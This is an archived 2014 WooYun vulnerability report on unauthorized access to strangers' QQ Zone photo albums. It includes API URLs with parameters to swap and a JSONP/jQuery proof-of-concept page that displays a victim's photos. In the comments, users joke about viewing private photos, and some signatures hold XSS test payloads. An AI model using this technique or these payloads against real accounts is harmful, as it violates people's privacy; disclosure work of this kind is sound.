{"id": 5993, "wybug_id": "wooyun-2014-047775", "wybug_title": "QQ空间可越权查看陌生人相册图片(高清)", "wybug_corp": "腾讯", "wybug_author": "blue", "wybug_date": "2014-01-03 16:42", "wybug_open_date": "2014-02-17 16:43", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-17：\t细节向公众公开  简要描述： RT，通过一些接口最终可以获取到陌生人的相册地址及查看其中的图片，非小图～ 详细说明：  1. 默认没有权限访问陌生人的空间和相册\n\n2. 进入到自己的空间，在全部动态位置，如果有好友动态，点击一下，查看网络请求，其中有以下接口：http://ic2.s21.qzone.qq.com/cgi-bin/feeds/feeds2_html_hotspot?uin=***(自己的QQ，需要保持登录)&visiteduin=***(经测试，可以为陌生人QQ)&count=10&alpha=1&useutf8=1&g_tk=***3. 将2获取到的json解析，可以得到topicid和pickey\n\n4. 在QQ空间还是全部动态位置，如果有好友发布了图片，点击查看图片，监控到一个接口:http://app.photo.qq.com/cgi-bin/app/cgi_floatview_photo_list?g_tk=***&callback=viewer_Callback&t=202307701&topicId=***&picKey=***&shootTime=&cmtOrder=1&fupdate=1&cmtNum=10&likeNum=5&inCharset=utf-8&outCharset=utf-8&callbackFun=viewer&offset=0&number=20&uin=***&appid=4&isFirst=1&hostUin=***(为想查看的人的QQ)&showMode=1&prevNum=9&postNum=18&_=1388730579218\"替换 ***内容为3获取到的，即能获取到相册图片列表5. 还等什么？看起吧～～   漏洞证明：  由于图片实在信息量太大～_^，所以在此不做截图，只将自己方便查看图片写的js程序贴上来～1. 获取动态接口(注意要是有发布图片动态的)http://10000.user.qzone.qq.com/test/qqphoto.html  (自己本地改的hosts，不然图片有referer限制)\n<div id=\"content\"></div><script src=\"jquery.js\"></script><script>function _Callback(d){\t$.each(d,function(k,v){\t\tif(k=='data'){\t\t\t$.each(v.data,function(ik,iv){\t\t\t\tif(ik==0){\t\t\t\t\t$.each(iv,function(jk,jv){\t\t\t\t\t\tif(jk=='html'){\t\t\t\t\t\t\t$('#content').html(jv);\t\t\t\t\t\t}\t\t\t\t\t});\t\t\t\t}\t\t\t});\t\t}\t});}</script><script src=\"http://ic2.s21.qzone.qq.com/cgi-bin/feeds/feeds2_html_hotspot?uin=***&visiteduin=***&count=10&alpha=1&useutf8=1&g_tk=***\"></script>\n2. 相册图片列表访问http://10000.user.qzone.qq.com/test/qqphotolist.html\n<div id=\"content\"></div><script src=\"jquery.js\"></script><script>function viewer_Callback(d){\tvar html='';\t$.each(d,function(k,v){\t\tif(k=='data'){\t\t\t$.each(v.photos,function(ik,iv){\t\t\t\thtml+='<img src=\"'+iv.url+'\" /><br/>';\t\t\t});\t\t\t$('#content').html(html);\t\t}\t});}</script><script src=\"http://app.photo.qq.com/cgi-bin/app/cgi_floatview_photo_list?g_tk=***&callback=viewer_Callback&t=202307701&topicId=***&picKey=***&shootTime=&cmtOrder=1&fupdate=1&cmtNum=10&likeNum=5&inCharset=utf-8&outCharset=utf-8&callbackFun=viewer&offset=0&number=20&uin=***&appid=4&isFirst=1&hostUin=***&showMode=1&prevNum=9&postNum=18&_=1388730579218\"></script>\n   修复方案：  权限判断好呗～   版权声明：转载请注明来源 blue@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-07 10:05 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-03 16:43 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  可有码？    \n     2014-01-03 16:44 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  我卡    \n     2014-01-03 16:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  高清    \n     2014-01-03 16:44 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  - -！我要举报    \n     2014-01-03 16:46 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  别告诉我还是老的那种的方法    \n     2014-01-03 16:47 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  原来是你    \n     2014-01-03 16:47 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  碉堡了！    \n     2014-01-03 16:52 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  不明觉厉，最新照片貌似就能查看    \n     2014-01-03 16:55 |    \t\t剑无名 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:32        | 此剑无名。)\t\t \n  不明觉厉，最新照片貌似就能查看     \n     2014-01-03 16:58 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  去看看肉肉的，看看她是不是又胖了~~    \n     2014-01-03 16:59 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  高清无码    \n     2014-01-03 17:04 |    \t\t摸了你 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:17        | 1shitMVqBjCKrnRvSoixMx6RKpG9J8pBM)\t\t \n  如实招来，你是不是看了肉肉的照片,你看肉肉都说原来是你。    \n     2014-01-03 17:07 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  最新照片就可以越权查看。。。我以为不是漏洞！！！    \n     2014-01-03 17:10 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:70        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  是能看整个相册的所有图片的～    \n     2014-01-03 17:13 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  挖擦，碉堡了，敢不敢侧陋下    \n     2014-01-03 17:22 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @blue 所有图片。。。。。。。。。。。    \n     2014-01-03 17:24 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @肉肉 是不是瞬间凌乱了    \n     2014-01-03 17:27 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @niliu 还好，跟我有什么关系=。=，我只是好奇怎么做到的    \n     2014-01-03 17:27 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  把艳照po到网上的人都是什么思想啊    \n     2014-01-03 17:28 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @肉肉 哈哈，开玩笑啦    \n     2014-01-03 17:29 |    \t\t帅气凌云 \t\t\t( 普通白帽子  |\t\t\t        Rank:314 漏洞数:60        | 弱点扫描{Www.VulScan.CN} 为网站健康检查...)\t\t \n  上次@肉肉才被钓了空间  这次.....    \n     2014-01-03 17:36 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:70        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  @肉肉 其中一个相册有20张照片？    \n     2014-01-03 17:54 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  高清步兵    \n     2014-01-03 17:55 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  高清无码    \n     2014-01-03 17:58 |    \t\t帅气凌云 \t\t\t( 普通白帽子  |\t\t\t        Rank:314 漏洞数:60        | 弱点扫描{Www.VulScan.CN} 为网站健康检查...)\t\t \n  尔等真是无语了    \n     2014-01-03 18:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去！！！！！！可以去看服务行业的了？    \n     2014-01-03 18:15 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  牛B    \n     2014-01-03 18:18 |    \t\t0x004er \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:19        | 。。。。。。。)\t\t \n  居然是“高清”。。。。。    \n     2014-01-03 18:21 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  V587    \n     2014-01-03 18:28 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  mark    \n     2014-01-03 18:53 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  高清无码。。。    \n     2014-01-03 18:55 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:10        | 简单点!啪......嚓~~)\t\t \n  我出 20wb 能提前让我看看漏洞么？    \n     2014-01-03 19:44 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @blue 我不记得了,反正没什么见不得人的,随便看随便看随便看.上次xss的事二哥请我吃火锅补偿我了的,你自己看着办    \n     2014-01-03 19:45 |    \t\tRootUser \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:5        | null)\t\t \n  mark    \n     2014-01-03 20:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @blue @肉肉 完了    \n     2014-01-03 21:28 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @肉肉 @肉肉 有吃的记得叫上我啊    \n     2014-01-03 21:57 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @px1624 好，我吃肉你吃菜    \n     2014-01-03 23:06 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  @肉肉 你来我这我带你去嫖    \n     2014-01-04 09:23 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @肉肉 好，看来我应该把昵称改成菜菜    \n     2014-01-04 11:04 |    \t\tMr.醉心 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 爱生活，爱音乐，爱美女，更爱波多野结衣)\t\t \n  不明觉厉    \n     2014-01-04 12:40 |    \t\t带着套套打飞机 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 嗯， 没什么介绍的。。。。。。。)\t\t \n  @HackBraid 嗯、    \n     2014-01-04 14:02 |    \t\t三院一霸 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 生命在于折腾)\t\t \n  高清！    \n     2014-01-04 14:22 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  无码    \n     2014-01-05 10:59 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2014-01-05 20:05 |    \t\tDefa \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:13        | <img src=1 onerror=alert(1)>)\t\t \n  牛逼    \n     2014-02-06 11:19 |    \t\tMicro Da \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:7        | Micro Da)\t\t \n  学习了.....    \n     2014-02-06 11:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  还可以用不？想去看隐私照。哈哈    \n     2014-02-15 00:04 |    \t\twusuopubupt \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | BUPTer, linux lover.)\t\t \n  马克加索尔    \n     2014-02-17 22:05 |    \t\t小黄蜂 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | 好男儿名垂千古&好姑娘永垂不朽)\t\t \n  应该加个无码，哈哈    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}